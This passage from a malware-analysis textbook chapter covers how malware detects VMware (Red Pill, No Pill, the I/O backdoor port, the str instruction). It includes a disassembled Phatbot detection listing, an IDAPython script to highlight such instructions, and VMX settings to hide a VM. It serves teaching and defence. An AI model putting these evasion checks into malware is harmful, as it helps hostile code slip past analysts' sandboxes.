<p class="calibre1">The malware issues the sidt instruction at , which stores the contents of IDTR into the memory location pointed to by EAX. The IDTR is 6 bytes, and the fifth byte offset contains the start of the base memory address. That fifth byte is compared to 0xFF, the VMware signature. </p>
<p class="calibre1">Red Pill succeeds only on a single-processor machine. It won’t work consistently against multicore processors because each processor (guest or host) has an IDT assigned to it. Therefore, the result of the sidt instruction can vary, and the signature used by Red Pill can be unreliable. </p>
<p class="calibre1">To thwart this technique, run on a multicore processor machine or simply NOP-out the sidt instruction. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using the No Pill Technique</b></i></p>
<p class="calibre1">The sgdt and sldt instruction technique for VMware detection is commonly known as No Pill. Unlike Red Pill, No Pill relies on the fact that the LDT </p>
<p class="calibre1">structure is assigned to a processor, not an operating system. And because Windows does not normally use the LDT structure, but VMware provides virtual support for it, the table will differ predictably: The LDT location on the host machine will be zero, and on the virtual machine, it will be nonzero. A simple check for zero against the result of the sldt instruction does the trick. </p>
<p class="calibre1">The sldt method can be subverted in VMware by disabling acceleration. </p>
<p class="calibre1">To do this, select <b class="calibre3">VM</b><b class="calibre3">Settings</b><b class="calibre3">Processors</b> and check the <b class="calibre3">Disable Acceleration</b> box. No Pill solves this acceleration issue by using the smsw instruction if the sldt method fails. This method involves inspecting the undocumented high-order bits returned by the smsw instruction. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Querying the I/O Communication Port </b></i></p>
<p class="calibre1">Perhaps the most popular anti-VMware technique currently in use is that of querying the I/O communication port. This technique is frequently encountered in worms and bots, such as the Storm worm and Phatbot. </p>
<p class="calibre1">VMware uses virtual I/O ports for communication between the virtual machine and the host operating system to support functionality like copy and paste between the two systems. The port can be queried and compared with a magic number to identify the use of VMware. </p>
<p class="calibre1">Anti-Virtual Machine Techniques</p>
<p class="calibre1"><b class="calibre3">375</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p409"/>The success of this technique depends on the x86 in instruction, which copies data from the I/O port specified by the source operand to a memory location specified by the destination operand. VMware monitors the use of the in instruction and captures the I/O destined for the communication channel port 0x5668 (VX). Therefore, the second operand needs to be loaded with VX in order to check for VMware, which happens only when the EAX </p>
<p class="calibre1">register is loaded with the magic number 0x564D5868 (VMXh). ECX must be loaded with a value corresponding to the action you wish to perform on the port. The value 0xA means “get VMware version type,” and 0x14 means “get the memory size.” Both can be used to detect VMware, but 0xA is more popular because it may determine the VMware version. </p>
<p class="calibre1">Phatbot, also known as Agobot, is a botnet that is simple to use. One of its features is its built-in support of the I/O communication port technique, as shown in Listing 17-3. </p>
<p class="calibre1">004014FA        push    eax</p>
<p class="calibre1">004014FB        push    ebx</p>
<p class="calibre1">004014FC        push    ecx</p>
<p class="calibre1">004014FD        push    edx</p>
<p class="calibre1">004014FE        mov     eax, 'VMXh' </p>
<p class="calibre1">00401503        mov     ebx, [ebp+var_1C]</p>
<p class="calibre1">00401506        mov     ecx, 0xA</p>
<p class="calibre1">00401509        mov     dx, 'VX' </p>
<p class="calibre1">0040150E        in      eax, dx</p>
<p class="calibre1">0040150F        mov     [ebp+var_24], eax</p>
<p class="calibre1">00401512        mov     [ebp+var_1C], ebx</p>
<p class="calibre1">00401515        mov     [ebp+var_20], ecx</p>
<p class="calibre1">00401518        mov     [ebp+var_28], edx</p>
<p class="calibre1">... </p>
<p class="calibre1">0040153E        mov     eax, [ebp+var_1C]</p>
<p class="calibre1">00401541        cmp     eax, 'VMXh' </p>
<p class="calibre1">00401546        jnz     short loc_40155C</p>
<p class="calibre1"> <i class="calibre4">Listing 17-3: Phatbot’s VMware detection</i></p>
<p class="calibre1">The malware first loads the magic number 0x564D5868 (VMXh) into the EAX </p>
<p class="calibre1">register at . Next, it loads the local variable var_1c into EBX, a memory address that will return any reply from VMware. ECX is loaded with the value 0xA to get the VMware version type. At , 0x5668 (VX) is loaded into DX, to be used in the following in instruction to specify the VMware I/O communication port. </p>
<p class="calibre1">Upon execution, the in instruction is trapped by the virtual machine and emulated to execute it. The in instruction uses parameters of EAX (magic value), ECX (operation), and EBX (return information). If the magic value matches VMXh and the code is running in a virtual machine, the virtual machine monitor will echo that back in the memory location specified by the EBX </p>
<p class="calibre1">register. </p>
<p class="calibre1">The check at  determines whether the code is being run in a virtual machine. Since the get version type option is selected, the ECX register will contain the type of VMware (1=Express, 2=ESX, 3=GSX, and 4=Workstation). </p>
<p class="calibre1"><b class="calibre3">376</b></p>
<p class="calibre1">Chapter 17</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p410"/>The easiest way to overcome this technique is to NOP-out the in instruction or to patch the conditional jump to allow it regardless of the outcome of the comparison. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using the str Instruction</b></i></p>
<p class="calibre1">The str instruction retrieves the segment selector from the task register, which points to the task state segment (TSS) of the currently executing task. </p>
<p class="calibre1">Malware authors can use the str instruction to detect the presence of a virtual machine, since the values returned by the instruction may differ on the virtual machine versus a native system. (This technique does not work on multiprocessor hardware.)</p>
<p class="calibre1">Figure 17-2 shows the str instruction at 0x401224 in malware known as <i class="calibre4">SNG.exe</i>. This loads the TSS into the 4 bytes: var_1 through var_4, as labeled by IDA Pro. Two comparisons are made at 0x40125A and 0x401262 to determine if VMware is detected. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Anti-VM x86 Instructions</b></i></p>
<p class="calibre1">We’ve just reviewed the most common instructions used by malware to employ anti-VM techniques. These instructions are as follows:</p>
<p class="calibre1"></p>
<p class="calibre1">sidt</p>
<p class="calibre1"></p>
<p class="calibre1">sgdt</p>
<p class="calibre1"></p>
<p class="calibre1">sldt</p>
<p class="calibre1"></p>
<p class="calibre1">smsw</p>
<p class="calibre1"></p>
<p class="calibre1">str</p>
<p class="calibre1"></p>
<p class="calibre1">in (with the second operand set to VX)</p>
<p class="calibre1"></p>
<p class="calibre1">cpuid</p>
<p class="calibre1">Malware will not typically run these instructions unless it is performing VMware detection, and avoiding this detection can be as easy as patching the binary to avoid calling these instructions. These instructions are basically useless if executed in user mode, so if you see them, they’re likely part of anti-VMware code. VMware describes roughly 20 instructions as “not virtualizable,” of which the preceding are the most commonly used by malware. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Highlighting Anti-VM in IDA Pro</b></i></p>
<p class="calibre1">You can search for the instructions listed in the previous section in IDA Pro using the IDAPython script shown in Listing 17-4. This script looks for the instructions, highlights any in red, and prints the total number of anti-VM </p>
<p class="calibre1">instructions found in IDA’s output window. </p>
<p class="calibre1">Figure 17-2 shows a partial result of running this script against  <i class="calibre4">SNG.exe</i> with one location (str at 0x401224) highlighted by the bar. Examining the highlighted code in IDA Pro will allow you to quickly see if the instruction found is involved in an anti-VM technique. Further investigation shows that the str instruction is being used to detect VMware. </p>
<p class="calibre1">Anti-Virtual Machine Techniques</p>
<p class="calibre1"><b class="calibre3">377</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p411"/><img src="index-411_1.png" alt="Image 88" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 17-2: The str anti-VM technique in </i> SNG.exe from idautils import *</p>
<p class="calibre1">from idc import *</p>
<p class="calibre1">heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))</p>
<p class="calibre1">antiVM = []</p>
<p class="calibre1">for i in heads:</p>
<p class="calibre1">if (GetMnem(i) == "sidt" or GetMnem(i) == "sgdt" or GetMnem(i) == "sldt" or GetMnem(i) == "smsw" or GetMnem(i) == "str" or GetMnem(i) == "in" or GetMnem(i) == "cpuid"):</p>
<p class="calibre1">antiVM.append(i)</p>
<p class="calibre1">print "Number of potential Anti-VM instructions: %d" % (len(antiVM)) for i in antiVM:</p>
<p class="calibre1">SetColor(i, CIC_ITEM, 0x0000ff)</p>
<p class="calibre1">Message("Anti-VM: %08x\n" % i)</p>
<p class="calibre1"> <i class="calibre4">Listing 17-4: IDA Pro script to find anti-VM instructions</i> <b class="calibre3">378</b></p>
<p class="calibre1">Chapter 17</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p412"/> <i class="calibre4"><b class="calibre3">Using ScoopyNG</b></i></p>
<p class="calibre1">ScoopyNG ( <i class="calibre4">http://www.trapkit.de/</i>) is a free VMware detection tool that implements seven different checks for a virtual machine, as follows:</p>
<p class="calibre1"></p>
<p class="calibre1">The first three checks look for the sidt, sgdt, and sldt (Red Pill and No Pill) instructions. </p>
<p class="calibre1"></p>
<p class="calibre1">The fourth check looks for str. </p>
<p class="calibre1"></p>
<p class="calibre1">The fifth and sixth use the backdoor I/O port 0xa and 0x14 options, respectively. </p>
<p class="calibre1"></p>
<p class="calibre1">The seventh check relies on a bug in older VMware versions running in emulation mode. </p>
<p class="calibre1">For a disassembled version of ScoopyNG’s fourth check, see Figure 17-2. </p>
<p class="calibre1"><b class="calibre3">Tweaking Settings</b></p>
<p class="calibre1">We have discussed a number of ways to thwart VMware detection throughout this chapter, including patching code, removing VMware Tools, changing VMware settings, and using a multiprocessor machine. </p>
<p class="calibre1">There are also a number of undocumented features in VMware that can help mitigate anti-VMware techniques. For example, placing the options in Listing 17-5 into the virtual machine’s  <i class="calibre4">.vmx</i> file will make the virtual machine less detectable. </p>
<p class="calibre1">isolation.tools.getPtrLocation.disable = "TRUE" </p>
<p class="calibre1">isolation.tools.setPtrLocation.disable = "TRUE" </p>
</body></html>